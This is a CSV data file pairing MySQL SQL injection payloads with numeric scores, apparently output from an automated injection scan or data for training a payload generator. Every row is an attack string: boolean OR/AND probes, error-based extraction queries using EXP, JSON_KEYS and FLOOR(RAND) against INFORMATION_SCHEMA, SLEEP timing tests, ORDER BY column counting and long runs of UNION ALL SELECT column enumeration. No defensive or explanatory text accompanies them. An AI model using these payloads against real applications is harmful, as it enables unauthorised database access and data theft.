payload,score
"['1"") AS sPGh WHERE 6063=6063 AND 1577=1577#']",100
['-6576'],0
['-8587) OR 9225=2755#'],0
['-3717) OR 1143=1143#'],0
['-4552)) OR 8578=4431#'],0
['-9023)) OR 1143=1143#'],0
['-3555))) OR 4225=5463#'],0
['-7549))) OR 1143=1143#'],0
['-6159 OR 3036=7368#'],0
['-8605 OR 1143=1143#'],0
['-8580)) AS JWak WHERE 1591=1591 OR 6874=3701#'],0
['-6761)) AS FiWC WHERE 5885=5885 OR 1143=1143#'],0
['-1464) AS OXXB WHERE 6707=6707 OR 2628=1500#'],0
['-1280) AS mCEk WHERE 3189=3189 OR 1143=1143#'],0
"[""-3748' OR 5629=3763#""]",0
"[""-3589' OR 1143=1143#""]",387
"[""-4918' OR 8518=4941#""]",0
"['-4461"" OR 6731=1582#']",0
"['-4245"" OR 1143=1143#']",0
"['-2196"") OR 2379=8393#']",0
"['-6461"") OR 1143=1143#']",0
"['-2268"")) OR 6268=6094#']",0
"['-4273"")) OR 1143=1143#']",0
"['-3781""))) OR 6964=7243#']",0
"['-9447""))) OR 1143=1143#']",0
"['-5834"")) AS MTVb WHERE 7982=7982 OR 8516=9892#']",0
"['-6214"")) AS eqLp WHERE 8576=8576 OR 1143=1143#']",0
"['-3975"") AS LUoX WHERE 4485=4485 OR 6459=3009#']",0
"['-8713"") AS sKPe WHERE 4329=4329 OR 1143=1143#']",0
['1) OR NOT 6690=1797#'],78
['1) OR NOT 9315=9315#'],78
['1)) OR NOT 4058=5627#'],79
['1)) OR NOT 9315=9315#'],79
['1))) OR NOT 3399=2088#'],80
['1))) OR NOT 9315=9315#'],80
['1 OR NOT 8336=1982#'],77
['1 OR NOT 9315=9315#'],77
['1)) AS pJgg WHERE 1771=1771 OR NOT 7442=2179#'],103
['1)) AS KOgo WHERE 3230=3230 OR NOT 9315=9315#'],103
['1) AS IIfW WHERE 3299=3299 OR NOT 2356=8213#'],102
['1) AS eVbH WHERE 5432=5432 OR NOT 9315=9315#'],102
['1` WHERE 8624=8624 OR NOT 6304=4431#'],94
['1` WHERE 6735=6735 OR NOT 9315=9315#'],94
['1`) WHERE 8542=8542 OR NOT 3094=7722#'],95
['1`) WHERE 1102=1102 OR NOT 9315=9315#'],95
"[""1' OR NOT 2436=1217#""]",387
"[""1' OR NOT 9315=9315#""]",78
"[""1' OR NOT 5856=3872#""]",387
"[""1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a7a7671,(SELECT (ELT(6333=6333,1))),0x7170627071,0x78))s), 8446744073709551610, 8446744073709551610)))-- lTlO""]",4228
"[""1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a7a7671,(SELECT (ELT(5177=5177,1))),0x7170627071,0x78))s), 8446744073709551610, 8446744073709551610)))-- NygF""]",4228
"[""1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7671,(SELECT (ELT(8388=8388,1))),0x7170627071,0x78))x))-- sCpp""]",4270
"[""1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7671,(SELECT (ELT(5127=5127,1))),0x7170627071,0x78))x))-- qXIC""]",4270
"[""1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a7a7671,(SELECT (ELT(2592=2592,1))),0x7170627071)) USING utf8)))-- PxZN""]",4285
"[""1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a7a7671,(SELECT (ELT(4055=4055,1))),0x7170627071)) USING utf8)))-- ZpUL""]",4285
"[""1' AND (SELECT 4461 FROM(SELECT COUNT(*),CONCAT(0x716a7a7671,(SELECT (ELT(4461=4461,1))),0x7170627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Eqlb""]",4273
"['(SELECT CONCAT(0x716a7a7671,(SELECT (ELT(7664=7664,1))),0x7170627071))']",0
"[""1' AND SLEEP(5)-- CjDr""]",0
"[""1' AND SLEEP(0)-- CjDr""]",0
"[""1' AND SLEEP(5)-- CjDr""]",0
"[""1' ORDER BY 1#""]",72
"[""1' ORDER BY 3765#""]",4284
"[""1' ORDER BY 10#""]",4286
"[""1' ORDER BY 6#""]",4287
"[""1' ORDER BY 4#""]",4287
"[""1' ORDER BY 3#""]",4287
"[""1' ORDER BY 2#""]",72
"[""1' UNION ALL SELECT CONCAT(0x716a7a7671,0x4c6e547177454d564c4b4d424856716a66685341786152797866595948705a6d4d5977636b6c7679,0x7170627071),NULL#""]",440
"[""1' UNION ALL SELECT CONCAT(0x716a7a7671,0x4c6e547177454d564c4b4d424856716a66685341786152797866595948705a6d4d5977636b6c7679,0x7170627071),NULL UNION ALL SELECT CONCAT(0x716a7a7671,0x7170416162754e4748794f4d7547784f596671434d667342704d4951564663666e526e504d587274,0x7170627071),NULL#""]",1097
"[""1' UNION ALL SELECT CONCAT(0x716a7a7671,0x4c6e547177454d564c4b4d424856716a66685341786152797866595948705a6d4d5977636b6c7679,0x7170627071),NULL FROM (SELECT 0 AS wBXS UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS RDmD#""]",7752
"[""1' UNION ALL SELECT NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL#""]",166
"[""1' UNION ALL SELECT NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""-2564' UNION ALL SELECT 4470#""]",4262
"[""-9017' UNION ALL SELECT 7678,7678#""]",90
"[""-2841' UNION ALL SELECT 8784,8784,8784#""]",4262
"[""-7801' UNION ALL SELECT 3006,3006,3006,3006#""]",4262
"[""-5082' UNION ALL SELECT 9409,9409,9409,9409,9409#""]",4262
"[""-6248' UNION ALL SELECT 9563,9563,9563,9563,9563,9563#""]",4262
"[""-1270' UNION ALL SELECT 3577,3577,3577,3577,3577,3577,3577#""]",4262
"[""-5628' UNION ALL SELECT 8368,8368,8368,8368,8368,8368,8368,8368#""]",4262
"[""-3280' UNION ALL SELECT 5751,5751,5751,5751,5751,5751,5751,5751,5751#""]",4262
"[""-9928' UNION ALL SELECT 4058,4058,4058,4058,4058,4058,4058,4058,4058,4058#""]",4262
"[""-3380' UNION ALL SELECT 2443,2443,2443,2443,2443,2443,2443,2443,2443,2443,2443#""]",4262
"[""-1085' UNION ALL SELECT 1709,1709,1709,1709,1709,1709,1709,1709,1709,1709,1709,1709#""]",4262
"[""-4159' UNION ALL SELECT 4902,4902,4902,4902,4902,4902,4902,4902,4902,4902,4902,4902,4902#""]",4262
"[""-3558' UNION ALL SELECT 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#""]",4262
"[""-7077' UNION ALL SELECT 6581,6581,6581,6581,6581,6581,6581,6581,6581,6581,6581,6581,6581,6581,6581#""]",4262
"[""-3076' UNION ALL SELECT 6831,6831,6831,6831,6831,6831,6831,6831,6831,6831,6831,6831,6831,6831,6831,6831#""]",4262
"[""-8155' UNION ALL SELECT 7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886,7886#""]",4262
"[""-3172' UNION ALL SELECT 8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850,8850#""]",4262
"[""-4697' UNION ALL SELECT 3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842,3842#""]",4262
"[""-2693' UNION ALL SELECT 5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065,5065#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""-4026' UNION ALL SELECT 7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590,7590#""]",4262
"[""-7757' UNION ALL SELECT 8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295,8295#""]",4262
"[""-2415' UNION ALL SELECT 1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737,1737#""]",4262
"[""-4289' UNION ALL SELECT 2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262,2262#""]",4262
"[""-9113' UNION ALL SELECT 6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774,6774#""]",4262
"[""-8173' UNION ALL SELECT 6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151,6151#""]",4262
"[""-8418' UNION ALL SELECT 5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831,5831#""]",4262
"[""-3217' UNION ALL SELECT 2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687#""]",4262
"[""-4260' UNION ALL SELECT 6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034,6034#""]",4262
"[""-3040' UNION ALL SELECT 5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602,5602#""]",4262
"[""-6619' UNION ALL SELECT 6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096,6096#""]",4262
"[""-3101' UNION ALL SELECT 7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832,7832#""]",4262
"[""-1588' UNION ALL SELECT 1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680,1680#""]",4262
"[""-4543' UNION ALL SELECT 9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552#""]",4262
"[""-4050' UNION ALL SELECT 3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744,3744#""]",4262
"[""-6171' UNION ALL SELECT 3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449,3449#""]",4262
"[""-8401' UNION ALL SELECT 7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432,7432#""]",4262
"[""-1836' UNION ALL SELECT 9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843,9843#""]",4262
"[""-7269' UNION ALL SELECT 9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316,9316#""]",4262
"[""-9451' UNION ALL SELECT 1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679,1679#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
